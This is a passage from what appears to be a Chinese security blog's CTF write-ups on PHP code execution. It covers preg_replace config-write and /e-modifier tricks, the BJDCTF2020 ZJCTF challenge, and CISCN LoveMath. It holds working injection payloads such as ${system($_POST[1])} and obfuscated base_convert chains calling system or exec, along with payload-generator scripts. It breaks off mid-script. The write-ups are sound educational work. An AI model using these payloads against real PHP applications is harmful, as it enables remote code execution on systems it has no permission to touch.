<span class="token variable">$api</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'api'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\$API = '.*';/s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$API = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$api</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p>
<p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">';phpinfo();'</span><span class="token punctuation">;</span></span></code></pre>

<p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'$API = '</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span></span></code></pre>

<p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p>
<ul>
<li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li>
<li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\$&#123;1&#125;</code>的形式。</li>
</ul>
<p>再来看看<code>preg_replace</code>的具体使用方法</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" loading="lazy">

<h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><strong>巨人的肩膀</strong></h3><ul>
<li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li>
<li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[小密圈]经典写配置漏洞与几种变形学习</a></li>
<li><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></li>
<li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHP模式修饰符</a></li>
</ul>
<h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a><em>栗子</em></h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a><strong>BJDCTF2020-ZJCTF—不过如此</strong></h4><p>首先题目先给出了一段代码：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php

error_reporting(0);
$text &#x3D; $_GET[&quot;text&quot;];
$file &#x3D; $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;
    echo (file_get_contents($text,&#39;r&#39;));
    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;
        die(&quot;Not now!&quot;);
    &#125;

    include($file);  &#x2F;&#x2F;next.php
    
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>

<p>构造<code>payload</code>读取<code>next.php</code>的内容</p>
<pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn</span>
<span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span>
<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=next.php</span></code></pre>

<p>将读到的base64解码得到<code>next.php</code>文件的内容</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造：</p>
<p><code>payload</code>：<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，</p>
<p>也可以利用里面的<code>getFlag</code>方法<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN-LoveMath-php动态函数执行</title>
    <url>/posts/a649e496/</url>
    <content><![CDATA[<p>  先看到题目给出的源码：</p>
<span id="more"></span>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//例子 c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//帮你算出答案</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>代码审计限制条件</p>
<ul>
<li>传入的<code>c</code>的字符串长度大小不能大于80</li>
<li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li>
<li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li>
</ul>
<p>以上条件满足后即可传入<code>eval</code>中执行代码</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre>

<p>分析：</p>
<ul>
<li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li>
<li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li>
<li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li>
<li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li>
<li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>翻译过来就是<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li>
</ul>
<p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p>
<p><code>base_convert</code>函数构造：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hex2bin'</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'len='</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string single-quoted-string">'base_convert参数->'</span><span class="token operator">.</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p>
<p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"_GET"</span><span class="token punctuation">;</span>
<span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$num</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>输出的结果既是可传入的值</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p>分析：</p>
<ul>
<li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li>
<li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li>
<li>以上语句翻译下来就是<code>exec(getallheaders()&#123;1&#125;)</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>&#123;&#125;</code>包囊数字来解决代替绕过中括号和引号</li>
</ul>
<p>发包即可拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p>
<p>当然这里直接<code>cat flag</code>也是可以的，如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">109270211243818</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token 